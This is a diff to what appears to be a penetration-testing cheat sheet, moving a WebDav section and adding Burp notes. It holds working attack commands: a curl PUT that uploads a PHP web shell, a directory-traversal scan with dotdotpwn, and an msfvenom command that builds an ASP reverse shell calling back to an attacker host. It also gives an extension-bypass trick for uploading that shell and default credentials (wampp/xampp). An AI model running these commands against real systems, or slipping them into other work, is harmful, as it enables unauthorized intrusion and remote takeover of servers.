@@ -252,22 +252,15 @@ curl -v -X PUT -d '<?php system($_GET["cmd"]); ?>' http://INSERTIPADDRESS/test/s
 ua-test http://INSERTIPADDRESS -d MDCTB
 
 # Check for title and all links
-dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o unix
-```
+dotdotpwn.pl -m http -h INSERTIPADDRESS -M GET -o windows
 
-### WebDav
-
-```
-cadaver INSERTIPADDRESS
-Try to put a shell.asp
-
-cd /root/Dropbox/Engagements/INSERTIPADDRESS/exploit && msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f asp -o shell.asp
-
-put /root/Dropbox/Engagements/INSERTIPADDRESS/exploit/shell.asp
-If the .asp extention is not allowed, try shell.asp.txt and use the mv command
-
-user: wampp
-pass: xampp 
+Step 3:
+Burp
+Send page to repeater
+  Look for headers that can be fuzzed
+  ID= that can be changed
+Send cookies to sequencer
+Send curious strings to decrypter
 ```
 
 ### LFI/RFI
@@ -335,6 +328,21 @@ sqlmap -u "http://INSERTIPADDRESS/index.php?id=1" --dbms=mysql
 
 # Crawl
 sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3
+```
+
+### WebDav
+
+```
+cadaver INSERTIPADDRESS
+Try to put a shell.asp
+
+cd /root/Dropbox/Engagements/INSERTIPADDRESS/exploit && msfvenom -p windows/shell_reverse_tcp LHOST=MYIPADDRESS LPORT=443 -f asp -o shell.asp
+
+put /root/Dropbox/Engagements/INSERTIPADDRESS/exploit/shell.asp
+If the .asp extention is not allowed, try shell.asp.txt and use the mv command
+
+user: wampp
+pass: xampp 
 ```
 
 ### Password brute force - last resort
